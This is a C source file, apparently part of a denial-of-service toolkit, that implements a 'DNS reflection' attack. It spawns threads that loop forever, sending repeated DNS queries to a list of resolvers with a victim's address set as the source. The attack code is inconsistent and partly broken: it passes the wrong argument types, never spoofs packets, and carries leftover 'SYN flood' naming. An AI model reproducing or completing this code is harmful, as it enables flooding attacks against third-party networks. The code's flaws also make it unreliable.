#include <stdio.h>      //printf
#include <string.h>     //strlen
#include <stdlib.h>     //malloc
#include <sys/socket.h> //you know what this is for
#include <arpa/inet.h>  //inet_addr , inet_ntoa , ntohs etc
#include <netinet/in.h>
#include <unistd.h> //getpid
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/types.h>
#include <signal.h>

#include "../main.h"
#include "attack_dns_reflect_dos.h"

extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

extern void FreeProcessDNSIPListBuff(pStrHeader p);
extern pStrHeader ProcessDNSIPListFile(pStrHeader *output);
extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
extern int LocateStrNodeElement(const pStrHeader p, pStrNode *element, const size_t loc);

extern void FreeSplitURLBuff(pSplitURLOutput p);
extern int SplitURL(const char *url, pSplitURLOutput *output);
extern void SignalExit(int signo);

extern pIPList_Thread SplitIPForThread(pIPList_Thread *output, const pInput input, const pStrHeader str_header);
extern void FreeIPListBuff(pIPList_Thread input);

//List of DNS Servers registered on the system
char dns_servers[10][100];
int dns_server_count = 0;
//Types of DNS resource records :)

#define T_A 1     //Ipv4 address
#define T_NS 2    //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6   /* start of authority zone */
#define T_PTR 12  /* domain name pointer */
#define T_MX 15   //Mail server

//#pragma pack(push, 1)
//#pragma pack(pop)

static void FreeDNSStructBuff(pDNSStruct input)
{
    // free the structure
    if (input)
    {
        if (input->dst_ip)
        {
            free(input->dst_ip);
        }
        free(input);
    }
}

static char *ReadName(unsigned char *reader, unsigned char *buffer, int *count)
{
    unsigned char *name;
    unsigned int p = 0, jumped = 0, offset;
    int i, j;

    *count = 1;
    name = (unsigned char *)malloc(256);

    name[0] = '\0';

    //read the names in 3www6google3com format
    while (*reader != 0)
    {
        if (*reader >= 192)
        {
            offset = (*reader) * 256 + *(reader + 1) - 49152; //49152 = 11000000 00000000 ;)
            reader = buffer + offset - 1;
            jumped = 1; //we have jumped to another location so counting wont go up!
        }
        else
        {
            name[p++] = *reader;
        }

        reader = reader + 1;

        if (jumped == 0)
        {
            *count = *count + 1; //if we havent jumped to another location then we can count up
        }
    }

    name[p] = '\0'; //string complete
    if (jumped == 1)
    {
        *count = *count + 1; //number of steps we actually moved forward in the packet
    }

    //now convert 3www6google3com0 to www.google.com
    for (i = 0; i < (int)strlen((const char *)name); i++)
    {
        p = name[i];
        for (j = 0; j < (int)p; j++)
        {
            name[i] = name[i + 1];
            i = i + 1;
        }
        name[i] = '.';
    }
    name[i - 1] = '\0'; //remove the last dot
    return name;
}

static void ChangetoDnsNameFormat(unsigned char *dns, unsigned char *host)
{
    // This will convert www.google.com to 3www6google3com
    // got it :)
    int lock = 0, i;
    strcat((char *)host, ".");

    for (i = 0; i < strlen((char *)host); i++)
    {
        if (host[i] == '.')
        {
            *dns++ = i - lock;
            for (; lock < i; lock++)
            {
                *dns++ = host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++ = '\0';
}

static int SendDNS(unsigned char *host, int query_type)
{
    // Perform a DNS query by sending a packet
    unsigned char buf[65536], *qname, *reader;
    int i, j, stop, s;
    struct sockaddr_in a;
    struct sockaddr_in dest;

    ResRecord answers[20], auth[20], addit[20]; //the replies from the DNS server
    pDNSHeader dns = NULL;
    pQuestion qinfo = NULL;

    printf("Resolving %s", host);

    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); //UDP packet for DNS queries

    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(dns_servers[0]); //dns servers

    //Set the DNS structure to standard queries
    dns = (pDNSHeader)&buf;

    dns->id = (unsigned short)htons(getpid());
    dns->qr = 0;     //This is a query
    dns->opcode = 0; //This is a standard query
    dns->aa = 0;     //Not Authoritative
    dns->tc = 0;     //This message is not truncated
    dns->rd = 1;     //Recursion Desired
    dns->ra = 0;     //Recursion not available! hey we dont have it (lol)
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1); //we have only 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;

    //point to the query portion
    qname = (unsigned char *)&buf[sizeof(DNSHeader)];

    ChangetoDnsNameFormat(qname, host);
    qinfo = (pQuestion)&buf[sizeof(DNSHeader) + (strlen((const char *)qname) + 1)]; //fill it

    qinfo->qtype = htons(query_type); //type of the query , A , MX , CNAME , NS etc
    qinfo->qclass = htons(1);         //its internet (lol)

    printf("\nSending Packet...");
    if (sendto(s, (char *)buf, sizeof(DNSHeader) + (strlen((const char *)qname) + 1) + sizeof(Question), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
    {
        perror("sendto failed");
    }
    printf("Done");

    //Receive the answer
    i = sizeof dest;
    printf("\nReceiving answer...");
    if (recvfrom(s, (char *)buf, 65536, 0, (struct sockaddr *)&dest, (socklen_t *)&i) < 0)
    {
        perror("recvfrom failed");
    }
    printf("Done");

    dns = (pDNSHeader)buf;

    //move ahead of the dns header and the query field
    reader = &buf[sizeof(DNSHeader) + (strlen((const char *)qname) + 1) + sizeof(Question)];

    printf("\nThe response contains : ");
    printf("\n %d Questions.", ntohs(dns->q_count));
    printf("\n %d Answers.", ntohs(dns->ans_count));
    printf("\n %d Authoritative Servers.", ntohs(dns->auth_count));
    printf("\n %d Additional records.\n\n", ntohs(dns->add_count));

    //Start reading answers
    stop = 0;

    for (i = 0; i < ntohs(dns->ans_count); i++)
    {
        answers[i].name = ReadName(reader, buf, &stop);
        reader = reader + stop;

        answers[i].resource = (pRData)(reader);
        reader = reader + sizeof(RData);

        if (ntohs(answers[i].resource->type) == 1) //if its an ipv4 address
        {
            answers[i].rdata = (unsigned char *)malloc(ntohs(answers[i].resource->data_len));

            for (j = 0; j < ntohs(answers[i].resource->data_len); j++)
            {
                answers[i].rdata[j] = reader[j];
            }

            answers[i].rdata[ntohs(answers[i].resource->data_len)] = '\0';

            reader = reader + ntohs(answers[i].resource->data_len);
        }
        else
        {
            answers[i].rdata = ReadName(reader, buf, &stop);
            reader = reader + stop;
        }
    }

    //read authorities
    for (i = 0; i < ntohs(dns->auth_count); i++)
    {
        auth[i].name = ReadName(reader, buf, &stop);
        reader += stop;

        auth[i].resource = (pRData)(reader);
        reader += sizeof(RData);

        auth[i].rdata = ReadName(reader, buf, &stop);
        reader += stop;
    }

    //read additional
    for (i = 0; i < ntohs(dns->add_count); i++)
    {
        addit[i].name = ReadName(reader, buf, &stop);
        reader += stop;

        addit[i].resource = (struct R_DATA *)(reader);
        reader += sizeof(RData);

        if (ntohs(addit[i].resource->type) == 1)
        {
            addit[i].rdata = (unsigned char *)malloc(ntohs(addit[i].resource->data_len));
            for (j = 0; j < ntohs(addit[i].resource->data_len); j++)
                addit[i].rdata[j] = reader[j];

            addit[i].rdata[ntohs(addit[i].resource->data_len)] = '\0';
            reader += ntohs(addit[i].resource->data_len);
        }
        else
        {
            addit[i].rdata = ReadName(reader, buf, &stop);
            reader += stop;
        }
    }

    //print answers
    printf("\nAnswer Records : %d \n", ntohs(dns->ans_count));
    for (i = 0; i < ntohs(dns->ans_count); i++)
    {
        printf("Name : %s ", answers[i].name);

        if (ntohs(answers[i].resource->type) == T_A) //IPv4 address
        {
            long *p;
            p = (long *)answers[i].rdata;
            a.sin_addr.s_addr = (*p); //working without ntohl
            printf("has IPv4 address : %s", inet_ntoa(a.sin_addr));
        }

        if (ntohs(answers[i].resource->type) == 5)
        {
            //Canonical name for an alias
            printf("has alias name : %s", answers[i].rdata);
        }

        printf("\n");
    }

    //print authorities
    printf("\nAuthoritive Records : %d \n", ntohs(dns->auth_count));
    for (i = 0; i < ntohs(dns->auth_count); i++)
    {

        printf("Name : %s ", auth[i].name);
        if (ntohs(auth[i].resource->type) == 2)
        {
            printf("has nameserver : %s", auth[i].rdata);
        }
        printf("\n");
    }

    //print additional resource records
    printf("\nAdditional Records : %d \n", ntohs(dns->add_count));
    for (i = 0; i < ntohs(dns->add_count); i++)
    {
        printf("Name : %s ", addit[i].name);
        if (ntohs(addit[i].resource->type) == 1)
        {
            long *p;
            p = (long *)addit[i].rdata;
            a.sin_addr.s_addr = (*p);
            printf("has IPv4 address : %s", inet_ntoa(a.sin_addr));
        }
        printf("\n");
    }
    return;
}

static int AttackThread(pDNSStruct dns_struct)
{
    // now we start the syn flood attack

    int i;
    pStrNode str_node = dns_struct->str_header->next;
    pSplitURLOutput split_result;

    DisplayDebug(DEBUG_LEVEL_3, dns_struct->debug_level, "AttackThread start sending data...");

    while (str_node)
    {

        // in here, we deal with the ip list
        if (!SplitURL(str_node->str, &split_result))
        {
            DisplayError("AttackThread SplitURL failed");
            return 1;
        }

        // node cicle

        DisplayDebug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %s", split_result->protocol);
        DisplayDebug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %s", split_result->host);
        DisplayDebug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %d", split_result->port);
        DisplayDebug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %s", split_result->suffix);

        if (split_result->port == 0)
        {
            if (strlen(split_result->host) == 0)
            {
                DisplayError("AttackThread SplitURL not right");
                return 1;
            }
            // make the port as default
            split_result->port = ACK_REFLECT_PORT_DEFAULT;
        }
        // init the target ip and port
        dns_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
        if (!(dns_struct->dst_ip))
        {
            DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        if (!memset(dns_struct->dst_ip, 0, IP_BUFFER_SIZE))
        {
            DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        if (!strncpy(dns_struct->dst_ip, split_result->host, strlen(split_result->host)))
        {
            DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        dns_struct->dst_port = split_result->port;
        FreeSplitURLBuff(split_result);

        // for test
        //DisplayWarning("src address: %s - src port: %d - dst address: %s - dst port: %d", syn_struct->src_ip, syn_struct->src_port, syn_struct->dst_ip, syn_struct->dst_port);

        for (i = 0; i < dns_struct->each_ip_repeat; i++)
        {
            if (SendDNS(dns_struct, dns_struct->debug_level))
            {
                DisplayError("AttackThread Attack failed");
                return 1;
            }
        }

        str_node = str_node->next;
    }
    return 0;
}

int StartDNSReflectAttack(const pInput input)
{
    // this file's core function

    pthread_t tid[input->max_thread];
    pthread_attr_t attr;
    int j, ret;

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
    signal(SIGINT, SignalExit);

    pDNSStruct dns_struct = (pDNSStruct)malloc(sizeof(DNSStruct));
    pStrHeader str_header;
    pSplitURLOutput split_result;

    dns_struct->debug_level = input->debug_level;
    dns_struct->each_ip_repeat = input->each_ip_repeat;

    if (!ProcessDNSIPListFile(&str_header))
    {
        DisplayError("ProcessDNSIPListFile failed");
        return 1;
    }

    if (!SplitURL(input->address, &split_result))
    {
        DisplayError("AttackThread SplitURL failed");
        return 1;
    }
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            DisplayError("AttackThread SplitURL not right");
            return 1;
        }
        // make the port as default
        split_result->port = ACK_REFLECT_PORT_DEFAULT;
    }

    dns_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(dns_struct->src_ip))
    {
        DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(dns_struct->src_ip, 0, IP_BUFFER_SIZE))
    {
        DisplayError("AttackThread memset failed: %d(%s)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(dns_struct->src_ip, input->address, strlen(input->address)))
    {
        DisplayError("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    dns_struct->src_port = (int)split_result->port;

    FreeSplitURLBuff(split_result);

    pIPList_Thread list, tmp_list;
    if (!SplitIPForThread(&list, input, str_header))
    {
        DisplayError("SplitIPForThread failed");
        return 1;
    }
    // str_header no longer used
    free(str_header);

    // unlimit loop
    for (;;)
    {
        // only one process
        tmp_list = list;
        // start again
        for (j = 0; j < input->max_thread; j++)
        {
            /* 
                 * every thread has onlyone target address
                 * thread end try next address
                 */
            dns_struct->str_header = tmp_list->list;
            tmp_list = tmp_list->next;
            //DisplayWarning("syn_struct src_ip: %s", syn_struct->src_ip);

            //input->serial_num = (i * input->max_thread) + j;
            if (pthread_attr_init(&attr))
            {
                DisplayError("StartSYNFlood pthread_attr_init failed");
                return 1;
            }
            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            {
                DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
                return 1;
            }
            // create thread
            ret = pthread_create(&tid[j], &attr, (void *)AttackThread, dns_struct);
            //printf("j is: %d\n", j);
            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
            // here we make a map
            if (ret != 0)
            {
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
                DisplayError("Create pthread failed");
                return 1;
            }
            pthread_attr_destroy(&attr);
            // for the test
            // also for the each thread ready
            sleep(1);
        }
        //pthread_detach(tid);
        // join them all
        for (j = 0; j < input->max_thread; j++)
        {
            pthread_join(tid[j], NULL);
        }
        // exit for test
        //return 0;
    }
    FreeDNSStructBuff(dns_struct);
    FreeIPListBuff(list);

    //unsigned char hostname[100];
    //Now get the ip of this hostname , A record
    //ngethostbyname(hostname, T_A);
    return 0;
}

int StartDNSReflectTest(const pInput input)
{
    return 0;
}